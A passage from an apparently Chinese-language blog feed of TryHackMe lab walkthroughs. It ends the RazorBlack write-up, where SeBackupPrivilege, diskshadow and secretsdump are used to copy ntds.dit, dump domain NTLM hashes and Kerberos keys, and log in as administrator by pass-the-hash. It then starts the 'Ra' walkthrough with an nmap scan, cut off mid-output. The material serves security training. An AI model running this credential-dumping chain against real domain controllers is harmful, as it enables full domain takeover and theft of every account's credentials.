title="渗出："></a>渗出：</h4><p>之前Bloodhound已经看到是备份组了。滥用SeBackupPrivilege权限就好了，先拷贝卷影副本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$cat</span> backup <br><span class="hljs-built_in">set</span> metadata C:\tmp\tmp.cabs<br><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> whomi<br>create<br>expose %whomi% z:<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\tmp&gt; diskshadow.exe /s c:\tmp\backup.txt<br>Microsoft DiskShadow version 1.0<br>Copyright (C) 2013 Microsoft Corporation<br>On computer:  HAVEN-DC,  6/26/2022 12:14:45 AM<br><br>-&gt; <span class="hljs-built_in">set</span> metadata C:\tmp\tmp.cabs<br>-&gt; <span class="hljs-built_in">set</span> context persistent nowriters<br>-&gt; add volume c: <span class="hljs-built_in">alias</span> someAlias<br>-&gt; create<br>Alias someAlias <span class="hljs-keyword">for</span> shadow ID &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125; <span class="hljs-built_in">set</span> as environment variable.<br>Alias VSS_SHADOW_SET <span class="hljs-keyword">for</span> shadow <span class="hljs-built_in">set</span> ID &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125; <span class="hljs-built_in">set</span> as environment variable.<br><br>Querying all shadow copies with the shadow copy <span class="hljs-built_in">set</span> ID &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125;<br><br>* Shadow copy ID = &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125;%someAlias%<br>- Shadow copy <span class="hljs-built_in">set</span>: &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125;%VSS_SHADOW_SET%<br>- Original count of shadow copies = 1<br>- Original volume name: \\?\Volume&#123;115c1f55-0000-0000-0000-602200000000&#125;\ [C:\]<br>- Creation time: 6/26/2022 12:14:49 AM<br>- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1<br>- Originating machine: HAVEN-DC.raz0rblack.thm<br>- Service machine: HAVEN-DC.raz0rblack.thm<br>- Not exposed<br>- Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;<br>- Attributes:  No_Auto_Release Persistent No_Writers Differential<br><br>Number of shadow copies listed: 1<br>-&gt; expose %someAlias% h:<br>-&gt; %someAlias% = &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125;<br>The shadow copy was successfully exposed as h:\.<br>*Evil-WinRM* PS C:\tmp&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/giuliano108/SeBackupPrivilege<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\xyan1d3&gt; upload /home/mosaic/ToolBox/Bugs/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; upload /home/mosaic/ToolBox/Bugs/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\xyan1d3<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-r---        9/15/2018  12:19 AM                Desktop<br>d-r---        2/25/2021   9:34 AM                Documents<br>d-r---        9/15/2018  12:19 AM                Downloads<br>d-r---        9/15/2018  12:19 AM                Favorites<br>d-r---        9/15/2018  12:19 AM                Links<br>d-r---        9/15/2018  12:19 AM                Music<br>d-r---        9/15/2018  12:19 AM                Pictures<br>d-----        9/15/2018  12:19 AM                Saved Games<br>d-r---        9/15/2018  12:19 AM                Videos<br>-a----        6/26/2022  12:00 AM          12288 SeBackupPrivilegeCmdLets.dll<br>-a----        6/26/2022  12:00 AM          16384 SeBackupPrivilegeUtils.dll<br>-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml<br><br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; Import-Module .\SeBackupPrivilegeUtils.dll<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-built_in">mkdir</span> C:\tmp<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-built_in">cd</span> c:\tmp<br>*Evil-WinRM* PS C:\tmp&gt; copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite<br>*Evil-WinRM* PS C:\tmp&gt; reg save HKLM\SYSTEM C:\tmp\system<br>*Evil-WinRM* PS C:\tmp&gt; download ntds.dit<br>*Evil-WinRM* PS C:\tmp&gt; download system<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">secretsdump.py -system system -ntds ntds.dit LOCAL<br><br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::<br>raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::<br>raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::<br>raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::<br>raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::<br>[*] Kerberos keys from ntds.dit <br>Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf<br>Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8<br>Administrator:des-cbc-md5:d3b646b65bceb5c7<br>HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6<br>HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27<br>HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d<br>krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5<br>krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb<br>krbtgt:des-cbc-md5:857a46f13e91eae3<br>raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f<br>raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61<br>raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975<br>raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39<br>raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839<br>raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6<br>raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5<br>raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580<br>raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8<br>raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559<br>raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a<br>raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$evil</span>-winrm -i 10.10.104.184 -u administrator -H 9689931bed40ca5a2ce1218210177f0c<br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Ra</title>
    <link href="/post/TryHackMe-Ra.html"/>
    <url>/post/TryHackMe-Ra.html</url>
    
    <content type="html"><![CDATA[<p>You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).</p><p>Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?</p><p>Happy Hacking! </p><p>@4nqr34z and @theart42</p><h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Fri Jul  8 14:19:08 2022 as: nmap -sC -sV -T4 -oA Ra -Pn -p- 10.10.121.103</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.121.103<br>Host is up (0.28s latency).<br>Not shown: 65498 filtered tcp ports (no-response)<br>PORT      STATE SERVICE             VERSION<br>53/tcp    open  domain              Simple DNS Plus<br>80/tcp    open  http                Microsoft IIS httpd 10.0<br>|_http-title: Windcorp.<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-07-08 06:28:07Z)<br>135/tcp   open  msrpc               Microsoft Windows RPC<br>139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn<br>389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-08T06:29:46+00:00; -1s from scanner time.<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title.</span><br><span class="hljs-string">| tls-alpn: </span><br><span class="hljs-string">|_  http/1.1</span><br><span class="hljs-string">| http-auth: </span><br><span class="hljs-string">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="hljs-string">|   Negotiate</span><br><span class="hljs-string">|_  NTLM</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=Windows Admin Center</span><br><span class="hljs-string">| Subject Alternative Name: DNS:WIN-2FAA40QQ70B</span><br><span class="hljs-string">| Not valid before: 2020-04-30T14:41:03</span><br><span class="hljs-string">|_Not valid after:  2020-06-30T14:41:02</span><br><span class="hljs-string">| http-ntlm-info: </span><br><span class="hljs-string">|   Target_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Domain_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Computer_Name: FIRE</span><br><span class="hljs-string">|   DNS_Domain_Name: windcorp.thm</span><br><span class="hljs-string">|   DNS_Computer_Name: Fire.windcorp.thm</span><br><span class="hljs-string">|   DNS_Tree_Name: windcorp.thm</span><br><span class="hljs-string">|_  Product_Version: 10.0.17763</span><br><span class="hljs-string">445/tcp   open  microsoft-ds?</span><br><span class="hljs-string">464/tcp   open  kpasswd5?</span><br><span class="hljs-string">593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">636/tcp   open  ldapssl?</span><br><span class="hljs-string">2179/tcp  open  vmrdp?</span><br><span class="hljs-string">3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)</span><br><span class="hljs-string">3269/tcp  open  globalcatLDAPssl?</span><br><span class="hljs-string">3389/tcp  open  ms-wbt-server       Microsoft Terminal Services</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">| rdp-ntlm-info: </span><br><span class="hljs-string">|   Target_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Domain_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Computer_Name: FIRE</span><br><span class="hljs-string">|   DNS_Domain_Name: windcorp.thm</span><br><span class="hljs-string">|   DNS_Computer_Name: Fire.windcorp.thm</span><br><span class="hljs-string">|   DNS_Tree_Name: windcorp.thm</span><br><span class="hljs-string">|   Product_Version: 10.0.17763</span><br><span class="hljs-string">|_  System_Time: 2022-07-08T06:29:09+00:00</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=Fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2022-07-07T06:19:03</span><br><span class="hljs-string">|_Not valid after:  2023-01-06T06:19:03</span><br><span class="hljs-string">5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:49+00:00; -1s from scanner time.</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 4zivxtxln1</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">5223/tcp  open  ssl/hpvirtgrp?</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">5229/tcp  open  jaxflow?</span><br><span class="hljs-string">5262/tcp  open  jabber</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 4fzrryvm4k</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">5263/tcp  open  ssl/unknown</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span><br><span class="hljs-string">5269/tcp  open  xmpp                Wildfire XMPP Client</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     features: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|_    compression_methods: </span><br><span class="hljs-string">5270/tcp  open  ssl/xmp?</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span><br><span class="hljs-string">5275/tcp  open  jabber</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 346zc75r8d</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span><br><span class="hljs-string">5276/tcp  open  ssl/unknown</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">7070/tcp  open  http                Jetty 